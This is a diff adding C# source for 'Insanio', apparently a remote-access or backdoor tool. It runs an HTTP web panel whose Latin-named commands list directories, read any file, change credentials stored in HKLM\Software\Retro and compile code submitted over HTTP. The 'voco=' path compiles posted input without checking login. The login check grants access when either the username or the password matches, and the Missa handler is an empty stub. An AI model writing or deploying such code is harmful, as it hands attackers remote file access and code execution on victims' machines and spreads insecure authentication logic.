@@ -1,0 +1,267 @@
+using System;
+using System.IO;
+using System.Net;
+using System.Text;
+using System.Windows.Forms;
+using Microsoft.Win32;
+
+namespace Insanio
+{
+    partial class Form1
+    {
+        private void Commands(Stream output, string input)
+        {
+            if (input.Contains("voco="))
+            {
+                input = input.Remove(0, 5);
+                input = input.Replace("+", " ");
+                httpSend(output, Compile(input));
+                return;
+            }
+
+            if (input.Contains("ping="))
+            {
+                httpSend(output, "Pong");
+                return;
+            }
+
+            string command = input.Substring(input.IndexOf("=") + 1, input.IndexOf("&") - input.IndexOf("=") - 1);
+            string[] param = new string[5];
+            
+            input = input.Substring(input.IndexOf("&") + 1);
+            input = input.Substring(input.IndexOf("=") + 1);
+            input = input.Replace("+", " ");
+            
+            if (input.Contains(" "))
+            {
+                param = input.Split(new Char[] {' '});
+            }
+            else
+            {
+                param[0] = input;
+            }
+
+            switch (command)
+            {
+                default:
+                    httpSend(output, "Unknown command");
+                    return;
+                    
+                case "album": // File Manager
+                    httpSend(output, Album(param));
+                    return;
+
+                case "annuo": // Change password
+                    httpSend(output, Annuo(param));
+                    return;
+
+                case "miro": // View Files
+                    httpSend(output, Miro(param));
+                    return;
+
+                case "missa":
+                    httpSend(output, Missa(param));
+                    return;
+
+                case "ianitor": // Login
+                    httpSend(output, Ianitor(param));
+                    return;
+
+                case "ianua": // Logout
+                    httpSend(output, Ianua(param));
+                    return;
+
+                case "voco": // Compile
+                    httpSend(output, Voco(param));
+                    return;
+            }
+        }
+
+        private string htmlLayout(string strData)
+        {
+            string data = "<html><head><style type=\"text/css\">"
+                + "body {background: #000;}"
+                + "* {font-size: 10px; font-family: Verdana; color: #fff;}"
+                + "b {color: #e42217;} h1 {color: #e42217; font-size: 16px;}"
+                + "table {border: 0; cellpadding: 0; cellspacing: 0; width: 100%;}"
+                + "tr { width: 550px;}"
+                + "input, submit, textarea, select {background-color: #000; border: 1px solid #e42215;}"
+                + "#first {margin: 0 auto 0 auto; display: table; top: 40px; height: 100%; width: 500px; position: relative;}"
+                + "</style></head>"
+                + "<body>"
+                + "<div id=\"first\"><h1>Insanio</h1>"
+                + "<hr width=\"100%\" noshade style=\"color:red; background-color:red;\">"
+                + "<p><form name=\"form\" method=\"post\" action=\"http://" + theHost.Address.ToString() + ":" + theHost.Port.ToString() + "\"><p><select name=\"command\"><option value=\"album\">Album</option><option value=\"annuo\">Annuo</option><option value=\"ianitor\">Ianitor</option><option value=\"ianua\">Ianua</option><option value=\"missa\">Missa</option><option value=\"miro\">Miro</option><option value=\"voco\">Voco</option></select><input type=\"text\" name=\"param\" size=\"50\"><input type=\"submit\" value=\"SEND\"></form></p>"
+                + strData
+                + "<hr width=\"100%\" noshade style=\"color:red; background-color:red;\">"
+                + "<b>Version: 1.0</b>"
+                + "</div></body></html>";
+            
+            return data;
+        }
+
+        private string htmlTags(string temp)
+        {
+            string[] oChar = { "%3A", "%5C", "%21", "%22", "%A3", "%24", "%25",
+            "%5E" , "%26", "%28", "%29", "%3D", "%2B", "%7B", "%7D", "%5B", "%5D",
+            "%27", "%40", "%23", "%7E", "%2C", "%3C", "%3E", "%2F", "%3F", "%7C",
+            "%0D", "%0A", "%3B", "%09"};
+
+            string[] nChar = { ":", "\\", "!", "\"", "£", "$", "%",
+                "^", "&", "(", ")", "=", "+", "{", "}", "[", "]", 
+                "'", "@", "#", "~", ",", "<", ">", "/", "?", "|",
+                "\r", "\n", ";", "\t"};
+
+            for (int i = 0; i < oChar.Length; i++)
+            {
+                temp = temp.Replace(oChar[i], nChar[i]);
+            }
+
+            return temp;
+        }
+
+        /*                              *
+         *          Commands            *
+         *                              */                            
+        private string Album(string[] input)
+        {
+            if (login)
+            {
+                StringBuilder sb = new StringBuilder();
+
+                bool real = Directory.Exists(input[0]);
+
+                if (real)
+                {
+                    string[] dirs = Directory.GetDirectories(input[0]);
+
+
+                    sb.Append("Current Folder: <b>" + input[0] + "<br></p><p>\n<table><tbody>\n");
+
+                    foreach (string dir in dirs)
+                    {
+                        sb.AppendLine("<tr><td><b>" + dir + "</b></td><td>" + Directory.GetLastAccessTime(dir) + "</td></tr>\n");
+                    }
+
+                    string[] files = Directory.GetFiles(input[0]);
+
+                    foreach (string file in files)
+                    {
+                        sb.AppendLine("<tr><td><b>" + file + "</b></td><td>" + Directory.GetLastAccessTime(file) + "</td></tr>\n");
+                    }
+
+                    sb.AppendLine("</tbody></form></table>\n");
+
+                    return sb.ToString();
+                }
+
+                return "Not Found";
+            }
+            return "Unauthorized Access";
+        }
+
+        private string Annuo(string[] input)
+        {
+            if (login)
+            {
+                RegistryKey theKey = Registry.LocalMachine.OpenSubKey(@"Software\Retro", true);
+
+                if (input[0] == "username")
+                {
+                    theKey.SetValue("username", Encryption(input[1]));
+                    username = input[1];
+                    login = false;
+                    return "Username has been changed, please login again!";
+                }
+
+                if (input[0] == "password")
+                {
+                    theKey.SetValue("password", Encryption(input[1]));
+                    password = input[1];
+                    login = false;
+                    return "Password has been changed, please login again!";
+                }
+
+                return "Unknown command!";
+            }
+
+            return "Unauthorized Access";
+        }
+
+        private string Miro(string[] input)
+        {
+            string tmp = "<form name=\"form\" method=\"get\"><p><textarea name=\"file\" rows=\"16\" cols=\"44\">";
+                        
+            if (login)
+            {
+                try
+                {
+                    using (StreamReader sr = new StreamReader(input[0]))
+                    {
+                        String line;
+                        
+                        while ((line = sr.ReadLine()) != null)
+                        {
+                            tmp += line + "\n";
+                        }
+
+                        return tmp + "</textarea></p></form>";
+                    }
+                }
+                catch (Exception e)
+                {
+                    return e.Message;
+                }
+            }
+            return "Unauthorized Access";
+        }
+
+        private string Missa(string[] input)
+        {
+            if (login)
+            {
+                
+            }
+
+            return "Unauthorized Access";
+        }
+
+        private string Ianitor(string[] input)
+        {
+            if (input[0] == username || input[1] == password)
+            {
+                login = true;
+                return "You are now logged in.";
+            }
+            else
+            {
+                return "The information you have given is incorrect";
+            }
+        }
+
+        private string Ianua(string[] input)
+        {
+            if (login)
+            {
+                login = false;
+                return "Goodbye!";
+            }
+
+            return "Unauthorized Access";
+        }
+
+        private string Voco(string[] input)
+        {
+            if (login)
+            {
+                string strout = "<p>Source Code</p><form name=\"form\" method=\"post\" action=\"http://" + theHost.Address + ":" + theHost.Port + "\">"
+                    + "<p><textarea name=\"voco\" rows=\"20\" cols=\"90\"></textarea><br>"
+                    + "<input type=\"submit\" value=\"Compile\">&nbsp;</p></form>";
+
+                return strout;
+               
+            }
+            return "Unauthorized Access";
+        } 
+    }
+}
